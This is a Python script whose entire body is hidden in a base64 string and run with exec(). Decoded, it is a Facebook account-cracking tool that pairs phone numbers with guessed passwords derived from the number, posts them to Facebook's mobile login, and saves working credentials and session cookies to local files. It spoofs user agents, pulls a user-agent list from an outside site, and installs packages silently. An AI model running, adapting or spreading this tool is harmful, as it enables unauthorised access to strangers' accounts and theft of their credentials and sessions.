import base64
exec(base64.b64decode("ZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgc29wDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHRyZWQNCmltcG9ydCBvcyxzeXMsdGltZSxqc29uLHJhbmRvbSxyZSxzdHJpbmcscGxhdGZvcm0sYmFzZTY0LHBsYXRmb3JtLHV1aWQNCmltcG9ydCBtYXJzaGFsDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQogICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZSByZXF1ZXN0cyBmdXR1cmVzPT0yID4gL2Rldi9udWxsJykNCiAgICBvcy5zeXN0ZW0oJ3B5dGhvbiBLYXNoaWYucHknKQ0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCnVnZW4gPSBbXQ0KQSA9ICdceDFiWzE7MzdtJyANCkIgPSAnXHgxYlsxOzMxbScgDQpDID0gJ1x4MWJbMTs5MW0nIA0KRCA9ICdceDFiWzE7MzJtJw0KTSA9ICdcMDMzWzE7MzNtJw0KSCA9ICdcMDMzWzE7MzRtJw0KTiA9ICdceDFiWzE7MzdtJyAgICANCkUgPSAnXHgxYlsxOzkzbScgDQpGID0gJ1x4MWJbMTs5NG0nDQpHID0gJ1x4MWJbMTs5NW0nDQpQID0gJ1wwMzNbMTszN20nDQpSRUQgPSAnXDAzM1sxOzkxbScNCldISVRFID0gJ1wwMzNbMTs5N20nDQpHUkVFTiA9ICdcMDMzWzE7MzJtJyAjDQpZRUxMT1cgPSAnXDAzM1sxOzMzbScNCkJMVUUgPSAnXDAzM1sxOzM0bScNCk9SQU5HRSA9ICdcMDMzWzE7MzVtJw0KS0IgPSAneyBLQiB9Jw0KZm9yIHhkIGluIHJhbmdlKDEwMDAwKToNCiAgICBhPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28iLCcNCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJ10pDQogICAgYz0nIGVuLXVzOyBHVC0nDQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQ0KICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLycNCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQ0KICAgIGk9JzAnDQogICAgaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkNCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQ0KICAgIGw9J01vYmlsZSBTYWZhcmkvNTM3LjM2Jw0KICAgIHVha3UyPWYne2F9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9Jw0KICAgIHVnZW4uYXBwZW5kKHVha3UyKQ0KdHJ5Og0KICAgIG9zLnN5c3RlbSgnY3VybCBodHRwczovL2JhY2hvMTAwMS5ibG9nc3BvdC5jb20vMjAyMi8wNy91YS5odG1sIC1vIHVhLmh0bWwnKQ0KZXhjZXB0Og0KICAgIHBhc3MNCnNvY2s9b3BlbigndWEuaHRtbCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpDQpkZWYgdWFrdSgpOg0KICAgIHRyeToNCiAgICAgICAgdWE9b3BlbignYmJuZXcudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgZm9yIHViIGluIHVhOg0KICAgICAgICAgICAgdWdlbi5hcHBlbmQodWIpDQogICAgZXhjZXB0Og0KICAgICAgICBhPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9iYWNobzEwMDEuYmxvZ3Nwb3QuY29tLzIwMjIvMDcvdWEuaHRtbCcpLnRleHQNCiAgICAgICAgdWE9b3BlbignLnVzZXItYWdlbnRzLnR4dCcsJ3cnKQ0KICAgICAgICBhYT1yZS5maW5kYWxsKCdsaW5lIj4oLio/KTwnLHN0cihhKSkNCiAgICAgICAgZm9yIHVuIGluIGFhOg0KICAgICAgICAgICAgdWEud3JpdGUodW4rJ1xuJykNCiAgICAgICAgdWE9b3BlbignLnVzZXItYWdlbnRzLnR4dCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpDQpsb29wID0gMA0KY3BzID0gW10NCm9rcyA9IFtdDQp0d2YgPSBbXQ0KIA0KZGVmIGNsZWFyKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCmxvZ28gPWYiIiINCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANClx4MWJbMTs5NW0gIF9fICBfXyBfX19fICAgIF9fX18gICAgXyAgICAgICBfICAgICBfICAgXyAgICBfX19fICANClx4MWJbMTs5M218ICBcLyAgfCAgXyBcICAvIF9fX3wgIC8gXCAgICAgfCB8ICAgfCB8IC8gXCAgfCAgXyBcIA0KXHgxYlsxOzM1bXwgfFwvfCB8IHxfKSB8IFxfX18gXCAvIF8gXCBfICB8IHxfICB8IHwvIF8gXCB8IHwgfCB8DQpceDFiWzE7OTJtfCB8ICB8IHwgIF8gPCBfIF9fXykgLyBfX18gfCB8X3wgfCB8X3wgLyBfX18gXHwgfF98IHwNClx4MWJbMTszNG18X3wgIHxffF98IFxfKCB8X19fXy9fLyAgIFxfXF9fXy8gXF9fXy9fLyAgIFxffF9fX18vIA0KXHgxYlsxOzkxbSAgICAgICAgICAgICB8LyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpcMDMzWzE7OTJtICAgIF8gICAgICAgICAgXw0KXDAzM1sxOzkybSAgICAgXFwgICAgICAgIC8NClwwMzNbMTs5Mm0gICAgX19cXF9fX19fXy9fXw0KXDAzM1sxOzkybSAgICB8IFtcMDMzWzE7MzE7MW3CqVwwMzNbMTs5Mm1dICBbXDAzM1sxOzMxOzFtwqlcMDMzWzE7OTJtXSB84oCLDQogXDAzM1sxOzkybSAgIHwgIFtcMzNbMTszM209PT09XDAzM1sxOzkybV0gIHwgWytdIPCfhbfwn4Ww8J+FsvCfhbrwn4W08J+GgfCfhoIg8J+FsfCfhbDwn4W98J+FtvCfhbvwn4Ww8J+Fs/CfhbTwn4aC8J+FtyAgWytdDQpcMDMzWzE7OTJt4pWU4pWQ4pWQbzAw4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQMDBv4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMDMzWzE7MzE7MW3iloggXDAzM1sxOzkybSBb4oCiXSBcMDMzWzE7OTE7MW1BdXRob3IgICAgOiAgXDAzM1sxOzkybSDwn4eyIPCfh7cgLfCfh7gg8J+HpiDwn4evIPCfh68g8J+HpiDwn4epICAgICAgICAgICAgXDAzM1sxOzMxOzFtIOKWiA0KXDAzM1sxOzMxOzFt4paIIFwwMzNbMTs5Mm0gW+KAol0gXDAzM1sxOzMyOzFtV2hhdHNhcHAgIDogIFwwMzNbMTszNG0gK+KdveKdveKTv+KdtuKdveKdueKTvy3inbfinbbinbrinbbik7/inbsgICAgICAgIFwwMzNbMTszMTsxbSDilogNClwwMzNbMTszMTsxbeKWiCBcMDMzWzE7OTJtIFvigKJdIFwwMzNbMTszMTsxbVdoYXRzYXBwICA6IFwwMzNbMTs5Mm0gICvinb3inb3ik7/inbbinb3inbnik78t4p234p224p264p224pO/4p27ICAgICAgICAgICBcMDMzWzE7MzE7MW0g4paIDQpcMDMzWzE7MzE7MW3iloggXDAzM1sxOzkybSBb4oCiXSBcMDMzWzE7MzE7MW1Hb3J1cCBGYiAgOiAgXDAzM1sxOzMybSDihI3wnZS88J2Vg+KEmSDwnZWr8J2VoPCdlZ/wnZWWIFwwMzNbMTszMTsxbSDilogNClwwMzNbMTszMTsxbeKWiCBcMDMzWzE7OTJtIFvigKJdIFwwMzNbMTszMTsxbVZlcnNpb24gICA6ICBcMDMzWzE7MzJtIDAuMyAgICAgICAgICAgICAgICAgIFwwMzNbMTszMTsxbeKWiA0KXDAzM1sxOzkybeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQ0KIiIiDQogDQogDQojIyMjIyAgICAgIyMjIw0KIA0KIA0KIA0KIA0KZGVmIGxpbmV4KCk6DQogICAgcHJpbnQoZic9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCmRlZiBjaGVja3Mob2tzLGNwcyx0d2YpOg0KICAgIGlmIG5vdCBsZW4ob2tzKSAhPSAwOg0KICAgICAgICBwYXNzDQogICAgaWYgbGVuKGNwcykgIT0gMDoNCiAgICAgICAgcHJpbnQoJ1xuXG5ceDFiWzE7OTdtIFRPVEFMIE9LIDogXHgxYlsxOzk3bSAlcyAgXHgxYlsxOzk3bUtCLU9LLnR4dCcgJSAoDQogICAgICAgICAgICBILCBQLCBzdHIobGVuKG9rcykpKSkNCiAgICAgICAgcHJpbnQoJ1x4MWJbMTs5N20gVE9UQUwgQ1AgOlx4MWJbMTs5N20gICAlcyBceDFiWzE7OTdtS0ItQ1AudHh0JyAlDQogICAgICAgICAgICAgIChILCBQLCBzdHIobGVuKGNwcykpKSkNCiAgICAgICAgcHJpbnQoJ1x4MWJbMTs5N20gVE9UQUwgMkYgOlx4MWJbMTs5N20gICAlcyBceDFiWzE7OTdtS0ItMkYudHh0JyAlDQogICAgICAgICAgICAgIChILCBQLCBzdHIobGVuKHR3ZikpKSkNCiAgICAgICAgaW5wdXQoIlx4MWJbMTs5N21QUkVTRSBFTlRFUiBUTyBCQUNLIHh5eiAgIikNCiAgICAgICAgeHl6KCkNCmxvb3AgPSAwDQpjcHMgPSBbXQ0Kb2tzID0gW10NCnR3ZiA9IFtdDQpkZWYgY2VrX2FwayhzZXNzaW9uLGNva2kpOg0KICAgIHc9c2Vzc2lvbi5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYnXHIgJXNbJXMhJXNdICVze09SQU5HRX1TT1JSWSBUSEVSRSBJUyBOTyBBQ1RJVkUgIEFQS1Mg8J+OriVzICAnJShPUkFOR0UpKQ0KICAgIGVsc2U6DQogICAgICAgIHByaW50KGYnXHIge0dSRUVOfVviiJpdICVzWU9VUiBBQ1RJVkUgQVBQTElDQVRJT04gREVUQUlMUyA6JyUoR1JFRU4pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcciVzWyVzXSAlcyAlcyAiJShOLGkrMSxnYW1lW2ldLiByZXBsYWNlKCJEaXRhbWJhaGthbiBwYWRhIiwiIERpdGFtYmFoa2FuIHBhZGEiKSxOKSkNCiAgICAgICAgI2Vsc2U6DQogICAgICAgICAgICAjcHJpbnQoZidcciAlc1slcyElc10gU29ycnksIEFwayBjaGVjayBmYWlsZWQgaW52YWxpZCBjb29raWUnJShOLE0sTikpDQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiLGNvb2tpZXM9eyJjb29raWUiOmNva2l9KS50ZXh0DQogICAgc29wID0gQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpDQogICAgeCA9IHNvcC5maW5kKCJmb3JtIixtZXRob2Q9InBvc3QiKQ0KICAgIGdhbWUgPSBbaS50ZXh0IGZvciBpIGluIHguZmluZF9hbGwoImgzIildDQogICAgaWYgbGVuKGdhbWUpPT0wOg0KICAgICAgICBwcmludChmJ1xyICVzWyVzISVzXSAlc3tPUkFOR0V9U09SUlkgVEhFUkUgSVMgTk8gRVhQSVJFRCBBUEtTIPCfjq4lcyclKE9SQU5HRSkpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcciDwn46uICAle1JFRH1zWU9VUiBFWFBJUkVEIEFQS1MgREVUQUlMUyA6JyUoUkVEKSkNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCiAgICAgICAgICAgIHByaW50KGYiXHIlc1slc10gJXMgJXMgIiUoTixpKzEsZ2FtZVtpXS4gcmVwbGFjZSgiS2VkYWx1d2Fyc2EiLCIgS2VkYWx1d2Fyc2EiKSxOKSkNCiAgICAgICAgICAgIHByaW50KGYie0dSRUVOfVviiJpdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tW+KIml0iKQ0KICAgICNfX19fX19fX19fX18jDQpkZWYgeHl6KCk6DQogICAgI29zLnN5c3RlbSgicGxheS1hdWRpbyBXRUxDT01FX1RPX2tiX0JPT1RfODE4Lm1wMyIpDQogICAgb3MuZ2V0dWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpO3ByaW50KGxvZ28pDQogICAgcHJpbnQoJyAgICAgICAgICAgXHgxYls5N21bXDAzM1szNzs0MW0gIE0gQSBJIE4gICBNIEUgTiBVICAgXDAzM1swO21dICcpDQogICAgcHJpbnQoZiIiKQ0KICAgIHByaW50KGYiWzAxXSB7V0hJVEV9U1RBUlQgUkFORE9NIENMT05JTkciKQ0KICAgIHByaW50KGYiWzAwXSB7V0hJVEV9RVhJVCBQUk9HUkFNICIpDQogICAgcHJpbnQoZiIiKQ0KICAgIHByaW50KGYiXDAzM1sxOzkxbT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikNCiAgICBLYXNoaWYgPSBpbnB1dCgiW+KIml0gQ0hPT1NFIDogIikNCiAgICBpZiBLYXNoaWYgaW4gWyIxIiwiMDEiXToNCiAgICAgICAgUmFuZG9tKCkNCiAgICBlbGlmIEthc2hpZiBpbiBbIjAiLCIwMCJdOg0KICAgICAgIGV4aXQoKQ0KICAgIGVsc2U6DQogICAgICAgIHByaW50KCdcMDMzWzE7MzFtSU5DT1JFQ1QgT1BUSU9OIVwwMzNbMTszMW0nKQ0KICAgICAgICB4eXooKQ0KIA0KI19fX19fX19fX19fX18jDQogDQojX19fX19fX19fX19fX19fX19fX19fIw0KIA0KZGVmIFJhbmRvbSgpOg0KICAgIHVzZXI9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludChmIiIpDQogICAgY2xlYXIoKQ0KICAgIHByaW50KGYiICAgICAgICAgIFx4MWJbOTdtW1wwMzNbMzc7NDFtICBDIE8gRCBFICAgIE0gRSBOIFUgICBcMDMzWzA7bV0iKQ0KICAgIHByaW50KGYiIikNCiAgICBsaW5leCgpDQogICAgcHJpbnQoZiIgICAgICAgIFx4MWJbOTdtW1wwMzNbOTU7NDJtRVhBTVBMRSA68J+Rh1wwMzNbMDttXSIpDQogICAgcHJpbnQoZiIiKQ0KICAgIHByaW50KCcgMDMwNiAsMDMwMCAsMDMxNSAsMDMzMycpDQogICAgcHJpbnQoZiIgMDM0MSAsMDM0MiAsMDM0NSAsMDM0OSIpDQogICAgcHJpbnQoZiIgMDMyMSAsMDMxNiAsMDMwOCAsMDMwOSIpDQogICAgcHJpbnQoZiIiKQ0KICAgIGxpbmV4KCkNCiAgICBjb2RlID0gaW5wdXQoJyBQVVQgQ09ERSA6ICcpDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludChmIiIpDQogICAgcHJpbnQoZiIgICAgICAgICAgXHgxYls5N21bXDAzM1szNzs0MW0gIEwgSSBNIEkgVCAgIE0gRSBOIFUgICBcMDMzWzA7bV0iKQ0KICAgIHByaW50KGYiIikNCiAgICBsaW1pdCA9IGludChpbnB1dCgnIEVYQU1QTEU6IDEwMDAsIDIwMDAsIDUwMDAsIDEwMDAwXG5cbiBQVVQgQ0xPTklORyBMSU1JVDogJykpDQogICAgZm9yIG5tYnIgaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpDQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkNCiAgICB3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9MzApIGFzIHlhYXJpOiAgICANCiAgICAgICAgY2xlYXIoKQ0KICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpDQogICAgICAgIHByaW50KGYiIHtXSElURX1UT1RBTCBJRFogICAgICAgICAgICAgOiB7UkVEfSIrdGwpDQogICAgICAgIHByaW50KGYiIHtXSElURX1DT1VOVFJZIFlPVSBDSE9PU0UgICAgOiBQQUtJU1RBTiAiKQ0KICAgICAgICBwcmludChmIiB7V0hJVEV9TlVNQkVSIFlPVSBQVVQgICAgICAgIDoge1JFRH0iK2NvZGUpDQogICAgICAgIHByaW50KGYiIHtXSElURX1QUk9DRVNTIEhBUyBCRUVOIFNUQVJURUQiKQ0KICAgICAgICBwcmludChmIiB7V0hJVEV9QkUgUEFUSUVOVC4uLi4uLi4iKQ0KICAgICAgICBwcmludChmIiB7V0hJVEV9VE8gU1RPUCBQUk9DRVNTIEN0cmwgKyBaICIpDQogICAgICAgIHByaW50KGYnPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlDQogICAgICAgICAgICBwd3ggPSBbbG92ZV0NCiAgICAgICAgICAgIHlhYXJpLnN1Ym1pdChmcmVlLHVpZCxwd3gsdGwpDQpkZWYgZnJlZSh1aWQscHd4LHRsKToNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBva3MNCiAgICBnbG9iYWwgYWdlbnRzDQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgYmkgPSByYW5kb20uY2hvaWNlKFtBXSkNCiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHBybyA9IHJhbmRvbS5jaG9pY2UodWdlbikNCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbScpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7J2F1dGhvcml0eSc6J20uZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICdtZXRob2QnOiAnUE9TVCcsDQogICAgICAgICAgICAnc2NoZW1lJzogJ2h0dHBzJywNCiAgICAgICAgICAgICdhY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywNCiAgICAgICAgICAgICdhY2NlcHQtZW5jb2RpbmcnOid1dGYtOCcsJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsDQogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciIE5vdCBBO0JyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTAxIicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAndXNlci1hZ2VudCc6cHJvfQ0KICAgICAgICAgICAgbG8gPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYz1kZXByZWNhdGVkJmx3dj0xMDAmcmVmaWQ9OCcsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQNCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNzoyMl0NCiAgICAgICAgICAgICAgICBwcmludCgnXHJcMDMzWzE7OTFtW+KIml0tLS0tLS0tLS0tLS0tLS0tLS0tLS1b8J+HuCDwn4emIPCfh68g8J+HryDwn4emIPCfh6kgLU9LXS0tLS0tLS0tLS0tLS0tLS0tLS0tW+KIml1cbkVNQUlMIDogJyt1aWQrJ1xuVUlEICAgOiAnK2NpZCsnIOKImiAnK3BzKyAnXG5DT09LSUUgICA6ICcrY29raSsnXG5b4oiaXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVviiJpdJykNCiAgICAgICAgICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL/Cfh7gg8J+HpiDwn4evIPCfh68g8J+HpiDwn4epIPCfmI3wn5iYLU9LLnR4dCcsICdhJykud3JpdGUoY2lkKycgfCAnK3BzKydcbicpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQ9Y29raVsyNDozOV0NCiAgICAgICAgICAgICAgICBSZWQgPSAnXDAzM1sxOzMxbScNCiAgICAgICAgICAgICAgICBwcmludChmJ1xye1JlZH1bw5ddLS0tLS0tLS0tLS0tLS0tLS0tLS1b8J+HuCDwn4emIPCfh68g8J+HryDwn4emIPCfh6kgLUNQXS0tLS0tLS0tLS0tLS0tLS0tLS0tLVvDl11cbkVNQUlMIDogJyt1aWQrJ1xuVUlEICAgOiAnK2NpZCsnIOKImiAnK3BzKyAnXG5bw5ddLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tW8OXXVwwMzNbMTs5N20nKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQv8J+HuCDwn4emIPCfh68g8J+HryDwn4emIPCfh6kg8J+YjfCfmJgtQ1AudHh0JywgJ2EnKS53cml0ZShjaWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnL3gvY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZD1jb2tpWzc6MjJdDQogICAgICAgICAgICAgICAgUmVkID0gJ1wwMzNbMTszMW0nDQogICAgICAgICAgICAgICAgcHJpbnQoZidccntZRUxMT1d9W1RFTVAtTE9DS10gJytjaWQrJyB8ICcrcHMrJ1wwMzNbMTs5N20nKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQv8J+HuCDwn4emIPCfh68g8J+HryDwn4emIPCfh6kg8J+YjfCfmJgtMkYudHh0JywgJ2EnKS53cml0ZShjaWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICB0d2YuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbG9vcCs9MQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJcMzNbMTs5Mm1b8J+HuCDwn4emIPCfh68g8J+HryDwn4emIPCfh6kg8J+YjfCfmJhdIFslc11cMzNbMTs5N20gW09LOiVzfkNQOiVzXSclKGxvb3AsbGVuKG9rcyksbGVuKGNwcykpKSwgDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBjaGVja3Mob2tzLGNwcyx0d2YpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogDQogICAgICAgIA0KIA0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICB4eXooKQ=="))